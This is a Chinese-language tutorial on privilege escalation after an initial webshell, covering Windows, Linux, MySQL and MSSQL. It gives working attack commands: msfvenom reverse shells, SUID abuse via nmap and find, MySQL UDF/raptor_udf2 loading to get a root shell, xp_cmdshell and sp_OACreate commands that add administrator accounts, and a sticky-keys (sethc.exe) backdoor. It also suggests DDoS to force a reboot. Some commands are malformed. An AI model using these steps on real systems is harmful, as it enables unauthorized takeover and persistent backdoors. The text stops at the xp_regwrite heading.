**提权Webshell：**尽量能够获取webshell，如果获取不到webshell可以在有文件上传的地方上传反弹shell脚本；或者利用漏洞（系统漏洞，服务器漏洞，第三方软件漏洞，数据库漏洞）来获取shell。  
**反弹shell：**利用kali虚拟机msfVENOM编写反弹shell脚本  
被控制端发起的shell---通常用于被控制端因防火墙受限，权限不足、端口被占用  
**开启监听：**msfconsole模块监听响应的反弹shell脚本（当靶机点击脚本的时候），进入meterpreter模块，可以getsystem权限，获取信息等等，还可以开启远程服务功能（lcx，scocks5）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bf3eb27de9606c485572d20fd8f663c4b482a332.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bf3eb27de9606c485572d20fd8f663c4b482a332.png)  
**Windows系统溢出漏洞提权**  
windows(可执行文件：一种是.com；另一种.exe)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1b01bd3771402fc86c4341bf15272b932ec78eb3.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1b01bd3771402fc86c4341bf15272b932ec78eb3.png)  
**系统溢出漏洞操作说明**  
`1、明确漏洞编号及版本 2、明确漏洞利用平台及版本 3、确保cmd执行权限正常运行 4、确保服务器相关防护软件情况`  
**查看系统补丁，提权前期准备【前提已获取webshell】**

> 方法一：输入shell进入到该主机的shell下，然后：systeminfo 查看系统详细信息  
> 方法二：进入到 meterpreter 下，执行 run post/windows/gather/enum\_patches 可以直接查看补丁情况  
> 方法三：post/multi/recon/local\_exploit\_suggester 模块，用于快速识别系统中可能被利用的漏洞  
> 方法四：WMIC命令也可以查看补丁数量  
> wmic qfe get Caption,Description,HotFixID,InstalledOn  
> 也可以直接找是否存在某个cve-2018-8120对应的KB4131188补丁  
> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4131188"  
> 方法五：Windows Exploit Suggester  
> 该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。

通过msf生成反弹exe进行反弹操作，获取meterpreter通道  
监听获取成功后，进行exp的筛选  
探测可提取的模块use post/multi/recon/local\_exploit\_suggester

\[========\]  
**linux提权**  
**linux基础信息收集**  
uname -a 显示全部系统信息  
cat /etc/issue 内核信息。此命令也适用于所有的Linux发行版  
cat /etc/passwd 所有人都可看  
ps aux | grep root  
**(1)内核漏洞提权**  
方法：  
通过信息收集方式得知linux内核版本  
使用searchspolit搜索相应版本漏洞  
例：searchsploit linux 4.0.0  
searchsploit Ubuntu 16.04  
searchsploit Ubuntu 16 kernel 3.10  
找到对应的.c源文件,将其发送到靶机/或是靶机下载 scp， wget <http://127.0.0.1/xx.c>  
编译，gcc xxx.c -o exp  
**(2)SUID提权**  
概念  
SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。  
特点  
SUID 权限仅对二进制程序有效  
执行者对于该程序需要有可执行权限(x权限)  
SUID 权限仅仅在程序执行过程中有效  
执行该程序时，执行者将具有该程序拥有者的权限

首先在本地查找符合条件的文件，有以下三个命令  
列出来的所有文件都是以root用户权限来执行的，接下来找到可以提权的文件  
find / -user root -perm -4000 -print 2&gt;/dev/null  
find / -perm -u=s -type f 2&gt;/dev/null  
find / -user root -perm -4000 -exec ls -ldb {} \\;  
常用的可用于suid提权的文件  
Nmap、Vim、find、Bash、More、Less、cp  
**(3)nmap提权**  
较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。因此可以使用交互式控制台来运行具有相同权限的shell。  
方法一：  
启动交互模式，使用nmap --interactive  
!sh #执行之后将提供一个提权后的shell。  
方法二：  
Metasploit模块，也可以通过SUID Nmap二进制文件进行提权。  
exploit/unix/local/setuid\_nmap  
**(4)find提权**  
实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。  
**(5)sudo提权**  
sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。  
sudo 表示 “superuser do”。 它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。

**数据库提权**

> \--获取网站数据库的账号和密码，通过读取一些数据库配置文件  
> 数据库配置文件：命令规则（data、sql、inc、config、conn、database等）  
> \--通过mysql数据库的user表  
> 数据库安装文件：安装目录下data/mysql/user.myd  
> frm:描述表结构文件，字段长度  
> myi：索引信息  
> myd：数据库信息文件，存储数据信息

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-49b709bb9f22054c34f14437e192d31bec9081ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-49b709bb9f22054c34f14437e192d31bec9081ce.png)  
**(1)mysql数据库——udf提权**  
udf文件:udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能  
udf文件后缀名: .dll（windows）linux后缀名：.so

**提权原理**  
`已知root账号和密码，利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用`  
**注意事项**  
mysql版本小于5.1版本，udf.dll文件在windows2003下放在：c:\\windows\\system32。在windows2000放在：c:\\winnt\\system32  
mysql版本大于5.1版本，udf.dll文件必须放置在mysql安装目录下的lib\\plugin。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。

利用udf文件加载函数执行命令

```sql
create function cmdshell returns string soname 'udf.dll';  //returns string soname ‘导出的DLL路径’；
select cmdshell('net user ndsec ndsecpw /add');
select cmdshell('net localgroup administrators ndsec /add');
drop function cmdshell;
```

**(2)数据库提权——mof提权**  
mof文件:mof文件是mysql数据库的扩展文件  
存放路径（C:/windows/system32/wbem/mof/nullevt.mof）  
其作用是每隔5秒就会去监控进程创建和死亡。  
**提权条件**  
1、windows2003及以下  
2、mysql启动身份具有权限去读写C:/windows/system32/wbem/mof/目录  
3、secure-file-priv=不为null  
**提权原理**  
`mof文件每5秒就会执行，而且是系统权限，我们可以通过load_file将文件写入/wbme/mof，然后系统每5秒就会执行一次我们上传的mof mof当中是一段vbs脚本，通过通过控制vbs脚本让系统执行命令，进行提权。`

**(3)数据库提权——反弹端口提权**  
**提权条件**  
1、获取数据库的账号和密码，同时能够执行查询命令。  
2、secure\_file\_priv=,可导出udf.dll到系统目录或者mysql数据库安装目录下的lib下plugin  
3、授权mysql数据库远程用户的登录

**(4)数据库提权——启动项提权 (这种方法不推荐)**  
**提权原理**  
`使用mysql写文件，写一段vbs代码到开启自启动中。服务器重启的时候达到创建用户并提取。可以使用DDOS迫使服务器重启 提权条件 secure_file_priv不为null 已知账号和密码`

**(5)linux系统-udf提权**  
上传脚本进行监听  
靶机连接数据库  
查看版本

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chmod u+s /usr/bin/find');
find / -exec "/bin/sh" \;
```

**mssql数据库SA权限**  
执行命令存储过程：xp\_cmshell、sp\_OACreate  
注册表存储过程：xp\_regwrite  
**存储过程**  
其实质就是一个“集合”。它就是存储在sqlserver中预先定义好的“sql语句集合。”使用T-SQL语言编写好的各种小脚本共同组合成的集合体，我们就称为“存储过程”

**利用xp\_cmdshell提权**  
**（1）xp\_cmdshell解释**  
Xp\_cmdshell是sqlserver中的组件，可以以操作系统命令解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。可以用来执行系统命令  
**（2）xp\_cmdshell开启**  
默认在sql server2000中是开启的，在sqlserver2005之后的版本默认禁止。如果我们有sa权限，可以用命令开启

```shell
exec sp_configure ‘show advanced options’ , 1;reconfigure;
exec sp_configure ‘xp_cmdshell’, 1;reconfigure;
```

**xp\_cmdshell 关闭**

```shell
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'ole automation procedures',0;reconfigure;
exec sp_configure 'show advanced options',0;reconfigure;

```

**（3）当xp\_cmdshell删除或出错的情况下，使用sp\_OACreate组件**  
开启组件SP\_OACreate

```shell
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'ole automation procedures',1;reconfigure;
```

关闭组件SP\_OACreate

```shell
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'ole automation procedures',0;reconfigure;
exec sp_configure 'show advanced options',0;reconfigure;
```

利用SP\_OACreate添加用户提权

```shell
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user quan 123456 /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators quan /add'
```

利用SP\_OACreate的其他操作  
sp\_OACreate替换粘贴键

```shell
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
execsp_oamethod@o,'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
execsp_oamethod@o,'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
```

**（4）使用注册表存储过程：xp\_regwrite**